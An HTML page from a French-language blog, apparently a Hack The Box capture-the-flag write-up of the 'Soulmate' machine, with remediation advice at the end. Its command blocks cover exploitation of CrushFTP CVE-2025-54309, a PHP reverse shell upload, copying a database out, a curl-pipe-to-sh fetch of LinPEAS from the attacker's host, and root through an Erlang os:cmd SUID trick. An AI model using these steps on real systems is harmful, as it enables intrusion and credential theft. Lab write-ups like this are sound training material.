<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box Soulmate | Wanako Blog</title><meta name=keywords content="Hack The Box"><meta name=description content="Write Up du challenge Soulmate"><meta name=author content="Wanako Kanan"><link rel=canonical href=http://localhost:1313/posts/soulmate/><link crossorigin=anonymous href=/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css integrity="sha256-IhHKMWS+eDACT2qtKzouUghDpk+PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/img/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/img/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/img/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/img/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/soulmate/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/soulmate/"><meta property="og:site_name" content="Wanako Blog"><meta property="og:title" content="Hack The Box Soulmate"><meta property="og:description" content="Write Up du challenge Soulmate"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-08T13:00:00+02:00"><meta property="article:modified_time" content="2025-10-08T13:00:00+02:00"><meta property="article:tag" content="Hack the Box"><meta property="og:image" content="http://localhost:1313/images/avatar.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/images/avatar.png"><meta name=twitter:title content="Hack The Box Soulmate"><meta name=twitter:description content="Write Up du challenge Soulmate"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Hack The Box Soulmate","item":"http://localhost:1313/posts/soulmate/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box Soulmate","name":"Hack The Box Soulmate","description":"Write Up du challenge Soulmate","keywords":["Hack The Box"],"articleBody":"Writeup - Soulmate HTB Reconnaissance Scan Nmap nmap -A 10.10.11.86 R√©sultats :\nPort 22 : SSH (OpenSSH 8.9p1 Ubuntu) Port 80 : HTTP (nginx 1.18.0) Hostname identifi√© : soulmate.htb √ânum√©ration des sous-domaines gobuster vhost -w ~/ctf/03_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \\ -u http://soulmate.htb \\ --append-domain D√©couverte : ftp.soulmate.htb (redirection vers /WebInterface/login.html)\nüí° Note : Cette syntaxe de Gobuster est pr√©f√©rable car elle n‚Äôutilise pas de r√©solution DNS et teste directement les vhosts via l‚Äôen-t√™te Host.\nAjout dans /etc/hosts :\n10.10.11.86 soulmate.htb ftp.soulmate.htb Exploitation - CVE-2025-54309 (CrushFTP) Identification de la cible Sur http://ftp.soulmate.htb, on d√©couvre CrushFTP :\nVersion : 11.W.657-2025_03_08_07_52 (build du 8 mars 2025) Vuln√©rable √† CVE-2025-54309 (CRITIQUE) D√©tails de la vuln√©rabilit√© :\nAffecte les versions \u003c 10.8.5 et \u003c 11.3.4_23 Race condition permettant un bypass d‚Äôauthentification via l‚Äôexploitation d‚Äôune mauvaise validation AS2 Permet l‚Äôacc√®s admin via HTTPS/HTTP Reconnaissance avec l‚Äôoutil watchTowr python watchTowr-vs-CrushFTP-CVE-2025-54309.py http://ftp.soulmate.htb R√©sultat :\n[*] VULNERABLE! RACE CONDITION POSSIBLE! [*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount Exploitation - Cr√©ation d‚Äôun utilisateur admin python exploit.py http://ftp.soulmate.htb R√©sultat :\n[+] SUCCESS! User 'htbadmin' created successfully! [+] Admin user created: htbadmin:HTBPassword123! Connexion : http://ftp.soulmate.htb/WebInterface/\nUsername : htbadmin Password : HTBPassword123! Acc√®s initial (www-data) Modification du mot de passe de Ben Dans l‚Äôinterface CrushFTP, nous avons les privil√®ges pour modifier les mots de passe des utilisateurs. On d√©couvre que Ben a acc√®s au site principal et dispose d‚Äôun fichier shell.php.\nReverse shell Pr√©paration du payload :\nT√©l√©chargement de MonkeyShell (ou tout autre reverse shell PHP) Renommage en shell.php Configuration : IP attaquant + port 4444 Upload via CrushFTP (en tant que Ben)\nD√©clenchement :\nnc -lvnp 4444 curl http://soulmate.htb/shell.php Stabilisation du shell :\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' Shell obtenu : www-data@soulmate:~/soulmate.htb/config\n√âl√©vation de privil√®ges (www-data ‚Üí ben) Extraction de la base de donn√©es Dans config.php :\nprivate $db_file = '../data/soulmate.db'; Exfiltration :\ncp data/soulmate.db public/ T√©l√©chargement via navigateur : http://soulmate.htb/soulmate.db\nAnalyse de la base de donn√©es Ouverture avec un outil SQLite en ligne :\nSELECT * FROM users; R√©sultat :\nid: 1 username: admin password: $2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2 is_admin: 1 ‚ÑπÔ∏è Hash bcrypt difficile √† cracker, on continue l‚Äô√©num√©ration.\n√ânum√©ration avec LinPEAS D√©ploiement :\n# Sur la machine attaquante : curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \u003e linpeas.sh python -m http.server 8080 # Sur la cible : curl http://10.10.14.115:8080/linpeas.sh | sh D√©couverte cl√© :\nroot 945 /usr/local/lib/erlang_login/start.escript Extraction des credentials cat /usr/local/lib/erlang_login/start.escript Credentials trouv√©s :\n{user_passwords, [{\"ben\", \"HouseH0ldings998\"}]}, Qu‚Äôest-ce qu‚ÄôErlang ? Erlang est un langage de programmation fonctionnel d√©velopp√© par Ericsson, principalement utilis√© pour :\nLes syst√®mes distribu√©s et tol√©rants aux pannes Les t√©l√©communications Les syst√®mes temps r√©el Dans ce contexte, Erlang g√®re l‚Äôauthentification SSH via un script .escript (script Erlang ex√©cutable). Le service tourne en root et √©coute sur le port 2222 localement.\nConnexion SSH ssh ben@soulmate.htb Password : HouseH0ldings998\nFlag user :\ncat ~/user.txt √âl√©vation de privil√®ges (ben ‚Üí root) Exploitation du service Erlang Le service /usr/local/lib/erlang_login/start.escript tourne en root et expose un shell Erlang interactif.\nM√©thode 1 : Via SUID bit Connexion au service Erlang (port 2222) :\nssh ben@127.0.0.1 -p 2222 Prompt Erlang obtenu : (ssh_runner@soulmate)1\u003e\nAjout du bit SUID √† /bin/bash :\nos:cmd(\"/bin/bash -c 'chmod u+s /bin/bash'\"). Dans un autre terminal SSH (en tant que ben) :\n/bin/bash -p Root obtenu :\ncat /root/root.txt # 1181db740888adc04910d2e7cb46a364 M√©thode 2 : Ex√©cution directe Depuis le shell Erlang :\nos:cmd(\"id\"). # \"uid=0(root) gid=0(root) groups=0(root)\\n\" os:cmd(\"cat /root/root.txt\"). # \"1181db740888adc04910d2e7cb46a364\\n\" Timeline de l‚Äôattaque 1. Nmap ‚Üí D√©couverte de soulmate.htb 2. Gobuster vhost ‚Üí ftp.soulmate.htb (CrushFTP) 3. CVE-2025-54309 ‚Üí Cr√©ation admin (htbadmin) 4. CrushFTP ‚Üí Upload shell.php (utilisateur Ben) 5. Reverse shell ‚Üí www-data 6. Exfiltration soulmate.db ‚Üí √âchec (hash bcrypt) 7. LinPEAS ‚Üí D√©couverte Erlang service 8. start.escript ‚Üí Credentials de Ben 9. SSH ben@soulmate.htb ‚Üí user.txt 10. SSH ben@127.0.0.1:2222 ‚Üí Shell Erlang (root) 11. os:cmd() ‚Üí √âl√©vation root ‚Üí root.txt Flags User flag : [dans /home/ben/user.txt] Root flag : 1181db740888adc04910d2e7cb46a364 Rem√©diation Mettre √† jour CrushFTP ‚Üí Version ‚â• 11.3.4_23 Ne pas stocker de credentials en clair dans les scripts Principe du moindre privil√®ge : Le service Erlang ne devrait pas tourner en root Limiter l‚Äôacc√®s SSH au port 2222 (localhost uniquement + firewall) Audit des permissions : Pas de os:cmd() accessible sans validation Outils utilis√©s nmap, gobuster watchTowr-vs-CrushFTP-CVE-2025-54309.py MonkeyShell (reverse shell PHP) LinPEAS Client SSH Box owned! üéâ\n","wordCount":"701","inLanguage":"en","image":"http://localhost:1313/images/avatar.png","datePublished":"2025-10-08T13:00:00+02:00","dateModified":"2025-10-08T13:00:00+02:00","author":{"@type":"Person","name":"Wanako Kanan"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/soulmate/"},"publisher":{"@type":"Organization","name":"Wanako Blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/img/favicon-32x32.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Wanako Blog (Alt + H)"><img src=http://localhost:1313/images/avatar.png alt aria-label=logo height=35>Wanako Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/posts/ title=Blog><span>Blog</span></a></li><li><a href=http://localhost:1313/projets/ title=Projets><span>Projets</span></a></li><li><a href=http://localhost:1313/contact/ title=Contact><span>Contact</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;¬ª&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Hack The Box Soulmate
<span class=entry-hint title=Draft><svg height="35" viewBox="0 -960 960 960" fill="currentColor"><path d="M160-410v-60h3e2v60H160zm0-165v-60h470v60H160zm0-165v-60h470v60H160zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22-4.5 22.5T862.09-380L643-160H520zm3e2-263-37-37 37 37zM580-220h38l121-122-18-19-19-18-122 121v38zm141-141-19-18 37 37-18-19z"/></svg></span></h1><div class=post-description>Write Up du challenge Soulmate</div><div class=post-meta><span title='2025-10-08 13:00:00 +0200 CEST'>8 October 2025</span>&nbsp;¬∑&nbsp;4 min&nbsp;¬∑&nbsp;701 words&nbsp;¬∑&nbsp;Wanako Kanan</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#reconnaissance>Reconnaissance</a><ul><li><a href=#scan-nmap>Scan Nmap</a></li><li><a href=#√©num√©ration-des-sous-domaines>√ânum√©ration des sous-domaines</a></li></ul></li><li><a href=#exploitation---cve-2025-54309-crushftp>Exploitation - CVE-2025-54309 (CrushFTP)</a><ul><li><a href=#identification-de-la-cible>Identification de la cible</a></li><li><a href=#reconnaissance-avec-loutil-watchtowr>Reconnaissance avec l&rsquo;outil watchTowr</a></li><li><a href=#exploitation---cr√©ation-dun-utilisateur-admin>Exploitation - Cr√©ation d&rsquo;un utilisateur admin</a></li></ul></li><li><a href=#acc√®s-initial-www-data>Acc√®s initial (www-data)</a><ul><li><a href=#modification-du-mot-de-passe-de-ben>Modification du mot de passe de Ben</a></li><li><a href=#reverse-shell>Reverse shell</a></li></ul></li><li><a href=#√©l√©vation-de-privil√®ges-www-data--ben>√âl√©vation de privil√®ges (www-data ‚Üí ben)</a><ul><li><a href=#extraction-de-la-base-de-donn√©es>Extraction de la base de donn√©es</a></li><li><a href=#analyse-de-la-base-de-donn√©es>Analyse de la base de donn√©es</a></li><li><a href=#√©num√©ration-avec-linpeas>√ânum√©ration avec LinPEAS</a></li><li><a href=#extraction-des-credentials>Extraction des credentials</a></li><li><a href=#quest-ce-querlang->Qu&rsquo;est-ce qu&rsquo;Erlang ?</a></li><li><a href=#connexion-ssh>Connexion SSH</a></li></ul></li><li><a href=#√©l√©vation-de-privil√®ges-ben--root>√âl√©vation de privil√®ges (ben ‚Üí root)</a><ul><li><a href=#exploitation-du-service-erlang>Exploitation du service Erlang</a></li><li><a href=#m√©thode-1--via-suid-bit>M√©thode 1 : Via SUID bit</a></li><li><a href=#m√©thode-2--ex√©cution-directe>M√©thode 2 : Ex√©cution directe</a></li></ul></li><li><a href=#timeline-de-lattaque>Timeline de l&rsquo;attaque</a></li><li><a href=#flags>Flags</a></li><li><a href=#rem√©diation>Rem√©diation</a></li><li><a href=#outils-utilis√©s>Outils utilis√©s</a></li></ul></nav></div></details></div><div class=post-content><h1 id=writeup---soulmate-htb>Writeup - Soulmate HTB<a hidden class=anchor aria-hidden=true href=#writeup---soulmate-htb>#</a></h1><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=scan-nmap>Scan Nmap<a hidden class=anchor aria-hidden=true href=#scan-nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -A 10.10.11.86
</span></span></code></pre></div><p><strong>R√©sultats :</strong></p><ul><li>Port 22 : SSH (OpenSSH 8.9p1 Ubuntu)</li><li>Port 80 : HTTP (nginx 1.18.0)</li><li>Hostname identifi√© : <code>soulmate.htb</code></li></ul><h3 id=√©num√©ration-des-sous-domaines>√ânum√©ration des sous-domaines<a hidden class=anchor aria-hidden=true href=#√©num√©ration-des-sous-domaines>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster vhost -w ~/ctf/03_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>               -u http://soulmate.htb <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>               --append-domain
</span></span></code></pre></div><p><strong>D√©couverte :</strong> <code>ftp.soulmate.htb</code> (redirection vers <code>/WebInterface/login.html</code>)</p><blockquote><p>üí° <strong>Note :</strong> Cette syntaxe de Gobuster est pr√©f√©rable car elle n&rsquo;utilise pas de r√©solution DNS et teste directement les vhosts via l&rsquo;en-t√™te Host.</p></blockquote><p>Ajout dans <code>/etc/hosts</code> :</p><pre tabindex=0><code>10.10.11.86 soulmate.htb ftp.soulmate.htb
</code></pre><hr><h2 id=exploitation---cve-2025-54309-crushftp>Exploitation - CVE-2025-54309 (CrushFTP)<a hidden class=anchor aria-hidden=true href=#exploitation---cve-2025-54309-crushftp>#</a></h2><h3 id=identification-de-la-cible>Identification de la cible<a hidden class=anchor aria-hidden=true href=#identification-de-la-cible>#</a></h3><p>Sur <code>http://ftp.soulmate.htb</code>, on d√©couvre <strong>CrushFTP</strong> :</p><ul><li>Version : <code>11.W.657-2025_03_08_07_52</code> (build du 8 mars 2025)</li><li>Vuln√©rable √† <strong>CVE-2025-54309</strong> (CRITIQUE)</li></ul><p><strong>D√©tails de la vuln√©rabilit√© :</strong></p><ul><li>Affecte les versions &lt; 10.8.5 et &lt; 11.3.4_23</li><li>Race condition permettant un bypass d&rsquo;authentification via l&rsquo;exploitation d&rsquo;une mauvaise validation AS2</li><li>Permet l&rsquo;acc√®s admin via HTTPS/HTTP</li></ul><h3 id=reconnaissance-avec-loutil-watchtowr>Reconnaissance avec l&rsquo;outil watchTowr<a hidden class=anchor aria-hidden=true href=#reconnaissance-avec-loutil-watchtowr>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python watchTowr-vs-CrushFTP-CVE-2025-54309.py http://ftp.soulmate.htb
</span></span></code></pre></div><p><strong>R√©sultat :</strong></p><pre tabindex=0><code>[*] VULNERABLE! RACE CONDITION POSSIBLE!
[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount
</code></pre><h3 id=exploitation---cr√©ation-dun-utilisateur-admin>Exploitation - Cr√©ation d&rsquo;un utilisateur admin<a hidden class=anchor aria-hidden=true href=#exploitation---cr√©ation-dun-utilisateur-admin>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python exploit.py http://ftp.soulmate.htb
</span></span></code></pre></div><p><strong>R√©sultat :</strong></p><pre tabindex=0><code>[+] SUCCESS! User &#39;htbadmin&#39; created successfully!
[+] Admin user created: htbadmin:HTBPassword123!
</code></pre><p><strong>Connexion :</strong> <code>http://ftp.soulmate.htb/WebInterface/</code></p><ul><li>Username : <code>htbadmin</code></li><li>Password : <code>HTBPassword123!</code></li></ul><hr><h2 id=acc√®s-initial-www-data>Acc√®s initial (www-data)<a hidden class=anchor aria-hidden=true href=#acc√®s-initial-www-data>#</a></h2><h3 id=modification-du-mot-de-passe-de-ben>Modification du mot de passe de Ben<a hidden class=anchor aria-hidden=true href=#modification-du-mot-de-passe-de-ben>#</a></h3><p>Dans l&rsquo;interface CrushFTP, nous avons les privil√®ges pour modifier les mots de passe des utilisateurs. On d√©couvre que <strong>Ben</strong> a acc√®s au site principal et dispose d&rsquo;un fichier <code>shell.php</code>.</p><h3 id=reverse-shell>Reverse shell<a hidden class=anchor aria-hidden=true href=#reverse-shell>#</a></h3><ol><li><p><strong>Pr√©paration du payload :</strong></p><ul><li>T√©l√©chargement de MonkeyShell (ou tout autre reverse shell PHP)</li><li>Renommage en <code>shell.php</code></li><li>Configuration : IP attaquant + port 4444</li></ul></li><li><p><strong>Upload via CrushFTP</strong> (en tant que Ben)</p></li><li><p><strong>D√©clenchement :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>curl http://soulmate.htb/shell.php
</span></span></code></pre></div></li><li><p><strong>Stabilisation du shell :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div></li></ol><p><strong>Shell obtenu :</strong> <code>www-data@soulmate:~/soulmate.htb/config</code></p><hr><h2 id=√©l√©vation-de-privil√®ges-www-data--ben>√âl√©vation de privil√®ges (www-data ‚Üí ben)<a hidden class=anchor aria-hidden=true href=#√©l√©vation-de-privil√®ges-www-data--ben>#</a></h2><h3 id=extraction-de-la-base-de-donn√©es>Extraction de la base de donn√©es<a hidden class=anchor aria-hidden=true href=#extraction-de-la-base-de-donn√©es>#</a></h3><p>Dans <code>config.php</code> :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>private</span> <span class=nv>$db_file</span> <span class=o>=</span> <span class=s1>&#39;../data/soulmate.db&#39;</span><span class=p>;</span>
</span></span></code></pre></div><p><strong>Exfiltration :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cp data/soulmate.db public/
</span></span></code></pre></div><p>T√©l√©chargement via navigateur : <code>http://soulmate.htb/soulmate.db</code></p><h3 id=analyse-de-la-base-de-donn√©es>Analyse de la base de donn√©es<a hidden class=anchor aria-hidden=true href=#analyse-de-la-base-de-donn√©es>#</a></h3><p>Ouverture avec un outil SQLite en ligne :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p><strong>R√©sultat :</strong></p><pre tabindex=0><code>id: 1
username: admin
password: $2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2
is_admin: 1
</code></pre><blockquote><p>‚ÑπÔ∏è Hash bcrypt difficile √† cracker, on continue l&rsquo;√©num√©ration.</p></blockquote><h3 id=√©num√©ration-avec-linpeas>√ânum√©ration avec LinPEAS<a hidden class=anchor aria-hidden=true href=#√©num√©ration-avec-linpeas>#</a></h3><p><strong>D√©ploiement :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Sur la machine attaquante :</span>
</span></span><span class=line><span class=cl>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh &gt; linpeas.sh
</span></span><span class=line><span class=cl>python -m http.server <span class=m>8080</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Sur la cible :</span>
</span></span><span class=line><span class=cl>curl http://10.10.14.115:8080/linpeas.sh <span class=p>|</span> sh
</span></span></code></pre></div><p><strong>D√©couverte cl√© :</strong></p><pre tabindex=0><code>root  945  /usr/local/lib/erlang_login/start.escript
</code></pre><h3 id=extraction-des-credentials>Extraction des credentials<a hidden class=anchor aria-hidden=true href=#extraction-des-credentials>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /usr/local/lib/erlang_login/start.escript
</span></span></code></pre></div><p><strong>Credentials trouv√©s :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-erlang data-lang=erlang><span class=line><span class=cl><span class=p>{</span><span class=n>user_passwords</span><span class=p>,</span> <span class=p>[{</span><span class=s>&#34;ben&#34;</span><span class=p>,</span> <span class=s>&#34;HouseH0ldings998&#34;</span><span class=p>}]},</span>
</span></span></code></pre></div><h3 id=quest-ce-querlang->Qu&rsquo;est-ce qu&rsquo;Erlang ?<a hidden class=anchor aria-hidden=true href=#quest-ce-querlang->#</a></h3><p><strong>Erlang</strong> est un langage de programmation fonctionnel d√©velopp√© par Ericsson, principalement utilis√© pour :</p><ul><li>Les syst√®mes distribu√©s et tol√©rants aux pannes</li><li>Les t√©l√©communications</li><li>Les syst√®mes temps r√©el</li></ul><p>Dans ce contexte, Erlang g√®re l&rsquo;authentification SSH via un script <code>.escript</code> (script Erlang ex√©cutable). Le service tourne en root et √©coute sur le port <strong>2222</strong> localement.</p><h3 id=connexion-ssh>Connexion SSH<a hidden class=anchor aria-hidden=true href=#connexion-ssh>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh ben@soulmate.htb
</span></span></code></pre></div><p>Password : <code>HouseH0ldings998</code></p><p><strong>Flag user :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat ~/user.txt
</span></span></code></pre></div><hr><h2 id=√©l√©vation-de-privil√®ges-ben--root>√âl√©vation de privil√®ges (ben ‚Üí root)<a hidden class=anchor aria-hidden=true href=#√©l√©vation-de-privil√®ges-ben--root>#</a></h2><h3 id=exploitation-du-service-erlang>Exploitation du service Erlang<a hidden class=anchor aria-hidden=true href=#exploitation-du-service-erlang>#</a></h3><p>Le service <code>/usr/local/lib/erlang_login/start.escript</code> tourne en <strong>root</strong> et expose un shell Erlang interactif.</p><h3 id=m√©thode-1--via-suid-bit>M√©thode 1 : Via SUID bit<a hidden class=anchor aria-hidden=true href=#m√©thode-1--via-suid-bit>#</a></h3><ol><li><p><strong>Connexion au service Erlang (port 2222) :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh ben@127.0.0.1 -p <span class=m>2222</span>
</span></span></code></pre></div></li><li><p><strong>Prompt Erlang obtenu :</strong> <code>(ssh_runner@soulmate)1></code></p></li><li><p><strong>Ajout du bit SUID √† /bin/bash :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-erlang data-lang=erlang><span class=line><span class=cl><span class=nn>os</span><span class=p>:</span><span class=nf>cmd</span><span class=p>(</span><span class=s>&#34;/bin/bash -c &#39;chmod u+s /bin/bash&#39;&#34;</span><span class=p>).</span>
</span></span></code></pre></div></li><li><p><strong>Dans un autre terminal SSH (en tant que ben) :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/bin/bash -p
</span></span></code></pre></div></li><li><p><strong>Root obtenu :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /root/root.txt
</span></span><span class=line><span class=cl><span class=c1># 1181db740888adc04910d2e7cb46a364</span>
</span></span></code></pre></div></li></ol><h3 id=m√©thode-2--ex√©cution-directe>M√©thode 2 : Ex√©cution directe<a hidden class=anchor aria-hidden=true href=#m√©thode-2--ex√©cution-directe>#</a></h3><p>Depuis le shell Erlang :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-erlang data-lang=erlang><span class=line><span class=cl><span class=nn>os</span><span class=p>:</span><span class=nf>cmd</span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>).</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=s>&#34;uid=0(root) gid=0(root) groups=0(root)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nn>os</span><span class=p>:</span><span class=nf>cmd</span><span class=p>(</span><span class=s>&#34;cat /root/root.txt&#34;</span><span class=p>).</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=s>&#34;1181db740888adc04910d2e7cb46a364</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span></code></pre></div><hr><h2 id=timeline-de-lattaque>Timeline de l&rsquo;attaque<a hidden class=anchor aria-hidden=true href=#timeline-de-lattaque>#</a></h2><pre tabindex=0><code>1. Nmap ‚Üí D√©couverte de soulmate.htb
2. Gobuster vhost ‚Üí ftp.soulmate.htb (CrushFTP)
3. CVE-2025-54309 ‚Üí Cr√©ation admin (htbadmin)
4. CrushFTP ‚Üí Upload shell.php (utilisateur Ben)
5. Reverse shell ‚Üí www-data
6. Exfiltration soulmate.db ‚Üí √âchec (hash bcrypt)
7. LinPEAS ‚Üí D√©couverte Erlang service
8. start.escript ‚Üí Credentials de Ben
9. SSH ben@soulmate.htb ‚Üí user.txt
10. SSH ben@127.0.0.1:2222 ‚Üí Shell Erlang (root)
11. os:cmd() ‚Üí √âl√©vation root ‚Üí root.txt
</code></pre><hr><h2 id=flags>Flags<a hidden class=anchor aria-hidden=true href=#flags>#</a></h2><ul><li><strong>User flag :</strong> <code>[dans /home/ben/user.txt]</code></li><li><strong>Root flag :</strong> <code>1181db740888adc04910d2e7cb46a364</code></li></ul><hr><h2 id=rem√©diation>Rem√©diation<a hidden class=anchor aria-hidden=true href=#rem√©diation>#</a></h2><ol><li><strong>Mettre √† jour CrushFTP</strong> ‚Üí Version ‚â• 11.3.4_23</li><li><strong>Ne pas stocker de credentials en clair</strong> dans les scripts</li><li><strong>Principe du moindre privil√®ge</strong> : Le service Erlang ne devrait pas tourner en root</li><li><strong>Limiter l&rsquo;acc√®s SSH</strong> au port 2222 (localhost uniquement + firewall)</li><li><strong>Audit des permissions</strong> : Pas de <code>os:cmd()</code> accessible sans validation</li></ol><hr><h2 id=outils-utilis√©s>Outils utilis√©s<a hidden class=anchor aria-hidden=true href=#outils-utilis√©s>#</a></h2><ul><li><code>nmap</code>, <code>gobuster</code></li><li><code>watchTowr-vs-CrushFTP-CVE-2025-54309.py</code></li><li><code>MonkeyShell</code> (reverse shell PHP)</li><li><code>LinPEAS</code></li><li>Client SSH</li></ul><hr><p><strong>Box owned! üéâ</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/hack-the-box/>Hack the Box</a></li></ul><nav class=paginav><a class=next href=http://localhost:1313/posts/artificial/><span class=title>Next ¬ª</span><br><span>Hack The Box Artificial</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Wanako Blog</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
